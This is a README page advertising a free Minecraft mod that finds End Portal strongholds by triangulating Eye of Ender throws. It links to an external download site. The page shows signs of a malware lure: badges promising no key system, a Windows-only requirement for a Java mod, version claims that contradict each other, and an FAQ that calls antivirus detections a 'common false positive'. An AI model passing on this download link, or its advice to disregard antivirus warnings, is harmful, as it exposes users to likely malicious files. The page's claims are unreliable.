<div align="center">

# Stronghold Finder — Free Minecraft Mod (2026)

### Stronghold Finder: free Minecraft utility mod, no key, no ads.

[![DOWNLOAD](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-red?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
[![Status](https://img.shields.io/badge/STATUS-WORKING_%F0%9F%9F%A2-brightgreen?style=for-the-badge)](#features)
[![Key System](https://img.shields.io/badge/KEY-NO_KEY_required-success?style=for-the-badge)](#features)
[![Platform](https://img.shields.io/badge/PLATFORM-Windows_10_%E2%80%A2_11-blue?style=for-the-badge)](#requirements)

</div>

---

## 📖 About

Stronghold Finder triangulates End Portal room coordinates from two or more Eye of Ender throws, displaying the exact stronghold location on your in-game map.

---

## ✨ Features
<a name="features"></a>

- **Eye Triangulation** — throw two Eyes and get exact coordinates instantly.
- **Map Marker** — marks stronghold on the in-game minimap.
- **Multi-Stronghold** — shows all 128 strongholds in the ring pattern.
- **Ring Distance Display** — tells you which ring your stronghold is in.
- **Travel ETA** — estimates walking/running time to the target.
- **Nether Shortcut** — shows equivalent Nether coordinates for fast travel.

> 🔑 **100% free** — no key system, no linkvertise, no ads.

---

## 🛠️ Installation

1. **Download** the JAR for your Minecraft version from [Releases](https://github.com/laplaplaplas/stronghold-finder-mod/releases/latest) 👉 **[https://laplaplaplas.github.io/download/](https://laplaplaplas.github.io/download/)**
2. Place the JAR in your `.minecraft/mods/` folder.
3. Make sure **Forge** is installed for your Minecraft version.
4. Launch Minecraft. ✅

| MC Version | File |
|---|---|
| 1.16 | `stronghold-finder-mod-1.16.jar` |
| 1.17 | `stronghold-finder-mod-1.17.jar` |
| 1.18X | `stronghold-finder-mod-1.18X.jar` |
| 1.19X | `stronghold-finder-mod-1.19X.jar` |
| 1.20X | `stronghold-finder-mod-1.20X.jar` |
| 1.21X | `stronghold-finder-mod-1.21X.jar` |
| 26.1 | `stronghold-finder-mod-26.1.jar` |
| 26.2 | `stronghold-finder-mod-26.2.jar` |

---

## ✅ Requirements
<a name="requirements"></a>

- Windows 10/11 (64-bit)
- Minecraft Java Edition 1.16 – 1.21
- Minecraft Forge installed

---

## ❓ FAQ

**Is Stronghold Finder free?**

Yes — 100% free, updated 2026.

**Do I need the world seed?**

No — works purely from Eye of Ender throw angles.

**How accurate is it?**

Within a few blocks when two throws are used.

**Does antivirus flag it?**

Common false positive for mod JARs.

---

## ⚠️ Disclaimer

This is a **free, community-made** utility mod for **Minecraft Java Edition**, provided **as-is with no warranty**. Not affiliated with Mojang Studios or Microsoft. Use responsibly and only on servers where permitted.
